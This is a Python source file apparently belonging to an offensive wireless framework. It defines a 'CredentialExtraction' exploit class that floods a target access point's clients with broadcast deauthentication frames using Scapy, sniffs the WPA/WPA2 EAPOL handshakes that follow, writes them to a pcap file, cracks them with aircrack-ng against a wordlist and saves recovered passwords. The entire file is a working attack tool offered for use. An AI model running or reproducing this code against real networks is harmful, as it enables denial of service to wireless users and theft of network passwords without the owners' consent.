from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.layers.eap import EAPOL
from scapy.sendrecv import sendp, sniff
from scapy.all import conf, wrpcap
import subprocess
import time
import threading
import logging
import os

from .base_exploit import BaseExploit


class CredentialExtraction(BaseExploit):
    """
    A class to perform credential extraction by capturing WPA/WPA2 handshakes
    using deauthentication attacks and cracking them to retrieve network passwords.
    """

    def __init__(self, core_framework, vulnerability, wordlist_path, cracked_passwords_path='cracked_passwords.txt'):
        """
        Initializes the CredentialExtraction exploit.

        Args:
            core_framework: The core framework instance.
            vulnerability: A dictionary containing vulnerability details.
            wordlist_path (str): Path to the wordlist for cracking.
            cracked_passwords_path (str): Path to save cracked passwords.
        """
        super().__init__(core_framework, vulnerability)
        self.extracting = False
        self.extract_thread = None
        self.sniff_thread = None
        self.captured_handshakes = []
        self.vulnerability = vulnerability
        self.core = core_framework
        self.stop_event = threading.Event()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.wordlist_path = wordlist_path
        self.cracked_passwords_path = cracked_passwords_path

        # Ensure wordlist exists
        if not os.path.isfile(self.wordlist_path):
            self.logger.error(f"Wordlist file not found at {self.wordlist_path}")
            raise FileNotFoundError(f"Wordlist file not found at {self.wordlist_path}")

    def exploit(self):
        """
        Executes the credential extraction process.
        """
        self.logger.info("Starting Credential Extraction exploit.")
        target_network = self.vulnerability.get('target_network')

        if not target_network:
            self.logger.error("No target network specified for credential extraction.")
            return {"status": "error", "message": "No target network specified."}

        bssid = target_network.get('bssid')
        channel = target_network.get('channel')

        if not all([bssid, channel]):
            self.logger.error("Incomplete target network information for credential capture.")
            return {"status": "error", "message": "Incomplete target network information."}

        interface = self.core.packet_handler.packet_injector.interface
        self.logger.debug(f"Target BSSID: {bssid}, Channel: {channel}, Interface: {interface}")

        try:
            # Set the wireless interface to the target channel
            self._set_interface_channel(interface, channel)

            # Start the handshake capture thread
            self.extracting = True
            self.extract_thread = threading.Thread(target=self._capture_handshakes, args=(bssid, interface), daemon=True)
            self.extract_thread.start()

            # Start the sniffing thread
            self.sniff_thread = threading.Thread(target=self._sniff_handshakes, args=(bssid, interface), daemon=True)
            self.sniff_thread.start()

            self.logger.info("Credential Extraction exploit initiated.")
            return {"status": "success"}

        except Exception as e:
            self.logger.exception(f"Failed to start Credential Extraction exploit: {e}")
            return {"status": "error", "message": str(e)}

    def _set_interface_channel(self, interface, channel):
        """
        Sets the wireless interface to the specified channel.

        Args:
            interface (str): The network interface to configure.
            channel (int): The channel number to set.
        """
        self.logger.debug(f"Setting interface {interface} to channel {channel}.")
        try:
            subprocess.check_call(['iwconfig', interface, 'channel', str(channel)],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Interface {interface} set to channel {channel}.")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Failed to set channel on interface {interface}: {e}")
            raise

    def _capture_handshakes(self, bssid, interface, deauth_count=100, interval=0.1, pause=2):
        """
        Sends deauthentication packets to capture handshakes.

        Args:
            bssid (str): The BSSID of the target network.
            interface (str): The network interface to use for sending packets.
            deauth_count (int): Number of deauth packets to send per interval.
            interval (float): Time between sending individual deauth packets.
            pause (int): Time to wait between sending bursts of deauth packets.
        """
        self.logger.info("Starting to send deauthentication packets.")
        try:
            deauth_pkt = RadioTap() / Dot11(addr1='FF:FF:FF:FF:FF:FF',
                                           addr2=self.core.packet_handler.packet_injector.get_interface_mac(),
                                           addr3=bssid) / Dot11Deauth(reason=7)

            while not self.stop_event.is_set():
                sendp(deauth_pkt, iface=interface, count=deauth_count, inter=interval, verbose=False)
                self.logger.debug(f"Sent {deauth_count} deauth packets to {bssid}.")
                time.sleep(pause)
        except Exception as e:
            self.logger.exception(f"Error during deauthentication attack: {e}")
            self.stop_event.set()

    def _sniff_handshakes(self, bssid, interface, timeout=None):
        """
        Sniffs for EAPOL packets to capture handshakes.

        Args:
            bssid (str): The BSSID of the target network.
            interface (str): The network interface to use for sniffing.
            timeout (int, optional): Time in seconds to stop sniffing. None for indefinite.
        """
        self.logger.info("Starting to sniff for EAPOL handshakes.")

        def packet_filter(packet):
            return (packet.haslayer(Dot11) and
                    packet.type == 2 and  # Data frames
                    packet.addr3.lower() == bssid.lower() and
                    packet.haslayer(EAPOL))

        try:
            sniff(iface=interface,
                  prn=self._process_packet,
                  lfilter=packet_filter,
                  stop_filter=lambda x: self.stop_event.is_set(),
                  timeout=timeout)
        except Exception as e:
            self.logger.exception(f"Error during packet sniffing: {e}")
            self.stop_event.set()

    def _process_packet(self, packet):
        """
        Processes a captured packet and extracts the handshake if present.

        Args:
            packet: The captured Scapy packet.
        """
        if packet.haslayer(EAPOL):
            client_mac = packet.addr2
            self.logger.info(f"Captured EAPOL handshake from {client_mac}")
            self.captured_handshakes.append(packet)
            # Optionally, stop after capturing a certain number of handshakes
            # For example:
            # if len(self.captured_handshakes) >= desired_number:
            #     self.stop_event.set()

    def capture_handshake_callback(self, packet):
        """
        Callback function to process captured packets and extract handshakes.
        (Deprecated in favor of _process_packet)

        Args:
            packet: The captured Scapy packet.
        """
        self._process_packet(packet)

    def cleanup(self):
        """
        Cleans up after exploitation to restore the environment and initiate cracking.
        """
        self.logger.info("Cleaning up Credential Extraction exploit.")
        self.stop_event.set()

        if self.extract_thread and self.extract_thread.is_alive():
            self.extract_thread.join()
            self.logger.debug("Deauthentication thread has been terminated.")

        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.join()
            self.logger.debug("Sniffing thread has been terminated.")

        self.extracting = False

        # Optionally, reset the interface to its original state
        # For example, setting the channel back to automatic
        interface = self.core.packet_handler.packet_injector.interface
        try:
            subprocess.check_call(['iwconfig', interface, 'channel', 'auto'],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logger.info(f"Interface {interface} channel set back to auto.")
        except subprocess.CalledProcessError as e:
            self.logger.warning(f"Failed to reset channel on interface {interface}: {e}")

        self.logger.info(f"Total handshakes captured: {len(self.captured_handshakes)}")

        # Save captured handshakes to a pcap file
        handshake_file = self._save_handshakes()

        if handshake_file:
            # Initiate cracking process
            self._initiate_cracking(handshake_file)

    def _save_handshakes(self, filepath='captured_handshakes.pcap'):
        """
        Saves the captured handshakes to a file.

        Args:
            filepath (str): The path to the file where handshakes will be saved.

        Returns:
            str: The path to the saved handshake file.
        """
        if not self.captured_handshakes:
            self.logger.warning("No handshakes to save.")
            return None

        try:
            wrpcap(filepath, self.captured_handshakes)
            self.logger.info(f"Handshakes saved to {filepath}.")
            return filepath
        except Exception as e:
            self.logger.error(f"Failed to save handshakes: {e}")
            return None

    def _initiate_cracking(self, handshake_file, aircrack_path='aircrack-ng'):
        """
        Initiates the cracking process using Aircrack-ng.

        Args:
            handshake_file (str): Path to the pcap file containing captured handshakes.
            aircrack_path (str): Path to the aircrack-ng executable.
        """
        self.logger.info("Initiating cracking process.")
        if not os.path.isfile(handshake_file):
            self.logger.error(f"Handshake file {handshake_file} does not exist.")
            return

        if not os.path.isfile(self.wordlist_path):
            self.logger.error(f"Wordlist file {self.wordlist_path} does not exist.")
            return

        # Construct the Aircrack-ng command
        cmd = [
            aircrack_path,
            '-w', self.wordlist_path,
            '-b', self.vulnerability['target_network']['bssid'],
            handshake_file
        ]

        self.logger.debug(f"Running command: {' '.join(cmd)}")

        try:
            # Run Aircrack-ng as a subprocess
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            stdout, stderr = process.communicate()

            if process.returncode == 0:
                # Parse the output to find the cracked password
                for line in stdout.split('\n'):
                    if 'KEY FOUND!' in line:
                        password_line = next((l for l in stdout.split('\n') if 'KEY FOUND!' in l), None)
                        if password_line:
                            password = password_line.split(':')[-1].strip()
                            self._save_cracked_password(password)
                            self.logger.info(f"Password cracked: {password}")
                            return
                self.logger.info("Aircrack-ng completed without finding the password.")
            else:
                self.logger.error(f"Aircrack-ng failed with error: {stderr}")

        except FileNotFoundError:
            self.logger.error(f"Aircrack-ng not found at path: {aircrack_path}")
        except Exception as e:
            self.logger.exception(f"An error occurred during cracking: {e}")

    def _save_cracked_password(self, password):
        """
        Saves the cracked password to a file.

        Args:
            password (str): The cracked password.
        """
        try:
            with open(self.cracked_passwords_path, 'a') as f:
                f.write(f"{password}\n")
            self.logger.info(f"Cracked password saved to {self.cracked_passwords_path}.")
        except Exception as e:
            self.logger.error(f"Failed to save cracked password: {e}")

    # Optionally, implement a method to initiate cracking in a separate thread
    def start_cracking(self, handshake_file, aircrack_path='aircrack-ng'):
        """
        Starts the cracking process in a separate thread.

        Args:
            handshake_file (str): Path to the pcap file containing captured handshakes.
            aircrack_path (str): Path to the aircrack-ng executable.
        """
        cracking_thread = threading.Thread(target=self._initiate_cracking, args=(handshake_file, aircrack_path), daemon=True)
        cracking_thread.start()
        self.logger.info("Cracking thread started.")

    def execute(self, vuln_info: dict):
        """
        Execute the exploit based on vulnerability information.

        Args:
            vuln_info (dict): Information about the vulnerability to exploit.
        """
        self.logger.info(f"Executing exploit with vulnerability info: {vuln_info}")
        self.vulnerability = vuln_info
        self.exploit()
        self.cleanup()